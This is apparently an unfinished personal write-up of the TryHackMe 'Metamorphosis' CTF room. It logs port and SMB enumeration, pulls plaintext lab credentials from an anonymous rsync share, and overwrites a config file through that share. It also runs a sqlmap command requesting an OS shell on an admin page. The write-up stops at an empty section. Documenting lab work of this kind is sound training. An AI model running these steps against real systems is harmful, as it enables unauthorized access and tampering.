<h1 align="center">Metamorphosis</h1>
<p align="center">2025, August 3<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>454</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>Part of Incognito CTF</em>.<br>
<img width="80px" src="https://github.com/user-attachments/assets/d445dc5d-640d-41c7-a8df-31d19b858d8c"><br>
Click <a href=https://tryhackme.com/room/metamorphosis>here </a>to access this TryHackMe CTF.<br>
<img width="1200px" src=""></p>

<br>

<h2>Task 1 . Challenge</h2>
<p>Part of Incognito 2.0 CTF<br>

Like my work, Follow on twitter to be updated and know more about my work! (@0cirius0)</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>


> 1.1. <em>user.txt</em><br><a id='1.1'></a>
>> <strong><code>______</code></strong><br>
<p></p>

<br>

> 1.2. <em>root.txt</em><br><a id='1.2'></a>
>> <strong><code>______</code></strong><br>
<p></p>

<br>

<h1  align="center">Port Scanning<a id='2'></h1>

<div align="center"><p>

| **Port**           | **Service**          | **Version**                     |
|-------------------:|:---------------------|:--------------------------------|
| `22`               |`SSH`                 |OpenSSH 7.6p1 Ubuntu 4ubuntu0.3  |
| `80`               |`HTTP`                |Apache httpd 2.4.41              |
| `139`              |              |          | 
| `445`              |               |              | 
| `873`              |                |             | 

</p></div><br>



```bash
:~/Metamorphosis# nmap -sC -sV -Pn -p- -T4 xx.xxx.xxx.xx
...
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
873/tcp open  rsync       (protocol version 31)
...
Host script results:
|_nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-10-07T18:24:34
|_  start_date: N/A
```

```bash
:~/Metamorphosis# rustscan -a 10.201.123.26 --ulimit 5500 -b 65535 -- -A -Pn
...
PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
139/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
445/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
873/tcp open  rsync       syn-ack (protocol version 31)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 0s
| nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   <00>                 Flags: <unique><active>
|   <03>                 Flags: <unique><active>
|   <20>                 Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 35810/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 14752/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 45155/udp): CLEAN (Failed to receive data)
|   Check 4 (port 54881/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-10-07T18:26:09
|_  start_date: N/A
```



```bash
:~/Metamorphosis# rsync -avzh rsync://10.201.123.26/Conf .
receiving incremental file list
./
access.conf
bluezone.ini
debconf.conf
ldap.conf
lvm.conf
mysql.ini
php.ini
ports.conf
resolv.conf
screen-cleanup.conf
smb.conf
webapp.ini
```


<img width="1205" height="322" alt="image" src="https://github.com/user-attachments/assets/a45f9d98-94c9-4d8c-874c-a23ca35ad53d" />

<br>
<br>
<br>

```bash
:~/Metamorphosis# ls
access.conf  bluezone.ini  debconf.conf  ldap.conf  lvm.conf  mysql.ini  php.ini  ports.conf  resolv.conf  screen-cleanup.conf  smb.conf  webapp.ini
```

```bash
:~/Metamorphosis# cat webapp.ini
[Web_App]
env = prod
user = tom
password = theCat

[Details]
Local = No
```











:~/Metamorphosis# smbmap -u 'guest' -p '' -H 10.201.123.26
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.201.123.26...
[+] IP: 10.201.123.26:445	Name: 10.201.123.26                                     
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	IPC$                                              	NO ACCESS	IPC Service (ip-10-201-123-26 server (Samba, Ubuntu))



:~/Metamorphosis# smbclient -L 10.201.123.26 -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (ip-10-201-123-26 server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available






<h3>Dirsearch</h3>

```bash
:~/Metamorphosis# dirsearch -u http://10.201.104.23 -i200,301,302,401

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Metamorphosis/reports/http_10.201.104.23/_25-08-04_01-47-04.txt

Target: http://10.201.104.23/

[01:47:04] Starting: 
[01:47:14] 301 -  314B  - /admin  ->  http://10.201.104.23/admin/
[01:47:14] 200 -  129B  - /admin/
[01:47:15] 200 -    0B  - /admin/config.php
[01:47:15] 200 -  129B  - /admin/index.php

Task Completed
```


<h3>873/tcp open  rsync</h3>


```bash
:~/Metamorphosis# rsync --list-only rsync://xx.xxx.xxx.xx
Conf           	All Confs
```

```bash
:~/Metamorphosis# rsync --list-only rsync://xx.xxx.xxx.xx/Conf
drwxrwxrwx          4,096 2021/04/10 21:03:08 .
-rw-r--r--          4,620 2021/04/09 21:01:22 access.conf
-rw-r--r--          1,341 2021/04/09 20:56:12 bluezone.ini
-rw-r--r--          2,969 2021/04/09 21:02:24 debconf.conf
-rw-r--r--            332 2021/04/09 21:01:38 ldap.conf
-rw-r--r--         94,404 2021/04/09 21:21:57 lvm.conf
-rw-r--r--          9,005 2021/04/09 20:58:40 mysql.ini
-rw-r--r--         70,207 2021/04/09 20:56:56 php.ini
-rw-r--r--            320 2021/04/09 21:03:16 ports.conf
-rw-r--r--            589 2021/04/09 21:01:07 resolv.conf
-rw-r--r--             29 2021/04/09 21:02:56 screen-cleanup.conf
-rw-r--r--          9,542 2021/04/09 21:00:59 smb.conf
-rw-rw-r--             72 2021/04/10 21:03:06 webapp.ini
```

```bash
:~/Metamorphosis# rsync -av --list-only rsync://10.201.34.170/Conf
receiving incremental file list
drwxrwxrwx          4,096 2021/04/10 21:03:08 .
-rw-r--r--          4,620 2021/04/09 21:01:22 access.conf
-rw-r--r--          1,341 2021/04/09 20:56:12 bluezone.ini
-rw-r--r--          2,969 2021/04/09 21:02:24 debconf.conf
-rw-r--r--            332 2021/04/09 21:01:38 ldap.conf
-rw-r--r--         94,404 2021/04/09 21:21:57 lvm.conf
-rw-r--r--          9,005 2021/04/09 20:58:40 mysql.ini
-rw-r--r--         70,207 2021/04/09 20:56:56 php.ini
-rw-r--r--            320 2021/04/09 21:03:16 ports.conf
-rw-r--r--            589 2021/04/09 21:01:07 resolv.conf
-rw-r--r--             29 2021/04/09 21:02:56 screen-cleanup.conf
-rw-r--r--          9,542 2021/04/09 21:00:59 smb.conf
-rw-rw-r--             72 2021/04/10 21:03:06 webapp.ini

sent 20 bytes  received 379 bytes  798.00 bytes/sec
total size is 193,430  speedup is 484.79
```

```bash
:~/Metamorphosis# rsync -aPv rsync://xx.xxx.xxx.xx/Conf ./Conf
receiving incremental file list
created directory ./Conf
./
access.conf
          4,620 100%    4.41MB/s    0:00:00 (xfr#1, to-chk=11/13)
bluezone.ini
          1,341 100%    1.28MB/s    0:00:00 (xfr#2, to-chk=10/13)
debconf.conf
          2,969 100%    2.83MB/s    0:00:00 (xfr#3, to-chk=9/13)
ldap.conf
            332 100%  324.22kB/s    0:00:00 (xfr#4, to-chk=8/13)
lvm.conf
         94,404 100%   90.03MB/s    0:00:00 (xfr#5, to-chk=7/13)
mysql.ini
          9,005 100%    4.29MB/s    0:00:00 (xfr#6, to-chk=6/13)
php.ini
         70,207 100%   22.32MB/s    0:00:00 (xfr#7, to-chk=5/13)
ports.conf
            320 100%   78.12kB/s    0:00:00 (xfr#8, to-chk=4/13)
resolv.conf
            589 100%  143.80kB/s    0:00:00 (xfr#9, to-chk=3/13)
screen-cleanup.conf
             29 100%    5.66kB/s    0:00:00 (xfr#10, to-chk=2/13)
smb.conf
          9,542 100%    1.82MB/s    0:00:00 (xfr#11, to-chk=1/13)
webapp.ini
             72 100%   14.06kB/s    0:00:00 (xfr#12, to-chk=0/13)

sent 255 bytes  received 194,360 bytes  389,230.00 bytes/sec
total size is 193,430  speedup is 0.99
```

```bash
:~/Metamorphosis/myConf# ls
access.conf   debconf.conf  lvm.conf   php.ini     resolv.conf          smb.conf
bluezone.ini  ldap.conf     mysql.ini  ports.conf  screen-cleanup.conf  webapp.ini
```

```bash
:~/Metamorphosis/Conf# cat webapp.ini
[Web_App]
env = prod
user = tom
password = theCat

[Details]
Local = No
```

<p>

- edited <code>env</code></p>

```bash
:~/Metamorphosis/Conf# cat webapp.ini
[Web_App]
env = dev
user = tom
password = theCat

[Details]
Local = No
```

```bash
:~/Metamorphosis/myConf# rsync -aPv webapp.ini rsync://xx.xxx.xx.xxx/Conf/webapp.ini
sending incremental file list
webapp.ini
             71 100%    0.00kB/s    0:00:00 (xfr#1, to-chk=0/1)

sent 186 bytes  received 41 bytes  454.00 bytes/sec
total size is 71  speedup is 0.31
```

<h2>/admin/</h2>

<img width="1117" height="174" alt="image" src="https://github.com/user-attachments/assets/8ca2b59d-abd4-481a-95fc-7cce7ee7a40c" />

<br>
<h2>sqlmap</h2>

```bash
:~/Metamorphosis/myConf# sqlmap -u http://10.201.34.170/admin/index.php --level 5 --risk 3 --batch --os-shell
```

<h2>/admin/</h2>

<img width="1117" height="174" alt="image" src="https://github.com/user-attachments/assets/8ca2b59d-abd4-481a-95fc-7cce7ee7a40c" />


<p>

- launched Burp Suite<br>
- enabled FoxyProxy<br>
- Username: <code>tom</code><br>
- clicked Submit Query<br>

</p>

<h2>tom</h2>

<img width="1115" height="163" alt="image" src="https://github.com/user-attachments/assets/bb8eed2f-d752-425c-9c7c-5453d1d54d19" />


```bash

```
ffuf -u http:/10.201.104.23/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -fc 403 -e .phps
```

<h3>smb</h3>

```bash
:~/Metamorphosis# nxc smb metamorphosis.thm -u guest -p ''
SMB         10.201.104.23   445    IP-10-201-104-23 [*] Unix - Samba (name:IP-10-201-104-23) (domain:ec2.internal) (signing:False) (SMBv1:False) 
SMB         10.201.104.23   445    IP-10-201-104-23 [+] ec2.internal\guest: (Guest)
```

<h4>Shares</h4>

```bash
:~/Metamorphosis# nxc smb metamorphosis.thm -u guest -p '' --shares
SMB         10.201.104.23   445    IP-10-201-104-23 [*] Unix - Samba (name:IP-10-201-104-23) (domain:ec2.internal) (signing:False) (SMBv1:False) 
SMB         10.201.104.23   445    IP-10-201-104-23 [+] ec2.internal\guest: (Guest)
SMB         10.201.104.23   445    IP-10-201-104-23 [*] Enumerated shares
SMB         10.201.104.23   445    IP-10-201-104-23 Share           Permissions     Remark
SMB         10.201.104.23   445    IP-10-201-104-23 -----           -----------     ------
SMB         10.201.104.23   445    IP-10-201-104-23 print$                          Printer Drivers
SMB         10.201.104.23   445    IP-10-201-104-23 IPC$                            IPC Service (ip-10-201-104-23 server (Samba, Ubuntu))
```

<p>another way ...</p>

```bash
:~/Metamorphosis# smbclient -L metamorphosis.thm -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (ip-10-201-104-23 server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

<p>another way ...</p>

```bash
:~/Metamorphosis# smbmap -u 'guest' -p '' -H 10.201.104.23
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.201.104.23...
[+] IP: 10.201.104.23:445	Name: ip-10-201-104-23.ec2.internal                     
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	IPC$                                              	NO ACCESS	IPC Service (ip-10-201-104-23 server (Samba, Ubuntu))
```

<br>

```bash
:~/Metamorphosis# nxc smb metamorphosis.thm -u guest -p '' --rid
SMB         10.201.104.23   445    IP-10-201-104-23 [*] Unix - Samba (name:IP-10-201-104-23) (domain:ec2.internal) (signing:False) (SMBv1:False) 
SMB         10.201.104.23   445    IP-10-201-104-23 [+] ec2.internal\guest: (Guest)
SMB         10.201.104.23   445    IP-10-201-104-23 [-] RPC lookup failed: RPC method not implemented
```

<br>

```bash
:~/Metamorphosis# smbclient //metamorphosis.thm/print$ -N
tree connect failed: NT_STATUS_ACCESS_DENIED
```

<br>

```bash
~/Metamorphosis# smbclient //10.201.104.23/IPC$ -N
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
smb: \> exit
```

<br>

<h3>smbmap</h3>

```bash

```




